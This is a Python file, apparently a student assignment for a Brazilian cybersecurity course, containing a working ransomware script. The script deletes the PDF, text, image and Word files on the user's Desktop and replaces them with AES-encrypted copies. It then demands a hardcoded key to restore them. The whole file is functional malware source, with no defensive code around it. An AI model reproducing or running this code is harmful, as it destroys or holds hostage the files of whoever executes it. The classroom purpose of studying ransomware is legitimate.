'''
FIAP
Defesa Cibernética - 1TDCF - 2021
Development e Coding for Security
Prof. Ms. Fábio H. Cabrini
Atividade: Proposta da Global Solution 
Alunos:
Fernando De Souza – RM88717
Gabriel Anselmo Pires Dos Santos - RM87010
João Paulo Silva de Queiroz - RM86376
Mateus Amado Monteiro da Silva - RM87974
Tomás Esteves Andrade - RM89081
'''

import os  # sistema operacional
import glob  # busca os arquivos
import time
import pyaes  # biblioteca de criptografia aes
from pathlib import Path  # pathlib utilizada para setar os caminhos

lst_arqui = ['*.pdf', '*.txt', '*.jpg', '*.doc', ]
print('Criptografando')
time.sleep(3)

# Entra no Desktop e verifica
try:
    desktop = Path.home() / "Desktop"
except Exception:
    pass
os.chdir(desktop)


def criptografando():
    for files in lst_arqui:
        for format_file in glob.glob(files):
            print(format_file)
            f = open(f'{desktop}\\{format_file}', 'rb')  # rb = read binary e wb = write binary
            file_data = f.read()
            f.close()

            os.remove(f'{desktop}\\{format_file}')
            key = b"1ab2c3e4f5g6h7i8"  # 16 byts key - chave
            aes = pyaes.AESModeOfOperationCTR(key)  # gera a criptografia
            crypto_data = aes.encrypt(file_data)
            new_file = format_file + ".ransomencryptador"
            new_file = open(f'{desktop}\\{new_file}', 'wb')
            new_file.write(crypto_data)
            new_file.close()


def descrypt(decrypt_file):
    try:
        for file in glob.glob('*.ransomencryptador'):
            keybytes = decrypt_file.encode()
            name_file = open(file, 'rb')
            file_data = name_file.read()
            dkey = keybytes
            daes = pyaes.AESModeOfOperationCTR(dkey)  # gera a decriptografia
            decrypt_data = daes.decrypt(file_data)

            format_file = file.split('.')
            new_file_name = format_file[0] + '.' + format_file[1]

            dnew_file = open(f'{desktop}\\{new_file_name}', 'wb')
            dnew_file.write(decrypt_data)
            dnew_file.close()
    except ValueError as err:
        print('Chave inválida')


if __name__ == '__main__':
    criptografando()
    if criptografando:
        key = input('Seu PC foi criptografado :p, informe a chave  para liberar os arquivos:')
        if key == '1ab2c3e4f5g6h7i8':  # confirma se a chave de descriptografia foi colocada corretamente e entãos descriptografa
            descrypt(key)
            for del_file in glob.glob('*.ransomencryptador'):
                os.remove(f'{desktop}\\{del_file}')
        else:
            print('Chave de liberação inválida.')
